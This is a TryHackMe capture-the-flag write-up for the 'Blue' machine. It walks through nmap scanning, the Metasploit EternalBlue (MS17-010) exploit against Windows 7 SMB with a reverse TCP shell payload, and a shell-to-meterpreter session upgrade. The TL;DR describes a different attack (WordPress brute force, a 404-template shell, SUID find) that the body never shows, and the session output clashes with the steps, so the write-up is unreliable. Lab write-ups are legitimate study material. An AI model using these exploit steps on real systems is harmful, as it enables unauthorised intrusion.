# Blue — Writeup

**Fecha:** 5-10-2025\
**Plataforma:** TryHackMe

---

## TL;DR

Se encontró un WordPress vulnerable, se obtuvieron credenciales por fuerza bruta, se subió un reverse shell editando la plantilla 404, se consiguió shell como www-data, se mejoró a TTY interactiva y se explotó /usr/bin/find con SUID para elevar a root y leer las flags.

---

## Enumeration (nmap)

```bash
nmap -sV -sC --open $IP -oN scan.txt
```

**Comment:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.

**Result**
```bash
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
```

**Relevant Result**
* 445/tcp open microsoft-ds (Windows 7)
  
---

## Foothold (Metasploit)
**Search Exploit**
```bash
  msfconsole
  msf > search windows 7 eternalblue
#   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010
```
**Comment:** ``msfconsole`` abre la interfaz de Metasploit.


**Set Exploit**
```bash
  msf > Use 0
  msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS $MACHINEIP
  msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST $LOCALIP
  msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
```

**Run Exploit**
```bash
  msf exploit(windows/smb/ms17_010_eternalblue) > run
	{...}
  meterpreter > 
```
## Privilege Escalation
**Background Shell**
```bash
  meterpreter > (CTRL+Z) 
Background session 1? [y/N] y
```

**Shell to Meterpreter**
```bash
msf > search shell_to_meterpreter
#  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade
```
**List Sessions**
```bash
msf post(multi/manage/shell_to_meterpreter) > sessions -l
Active sessions
===============
  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  $IP -> $IP ($IP)

```
**Set & Run Meterpreter Shell**
```bash
 msf > Use 0
 msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
```
**Switch Privilege Sesssion**
```bash
msf post(multi/manage/shell_to_meterpreter) > sessions 2
```



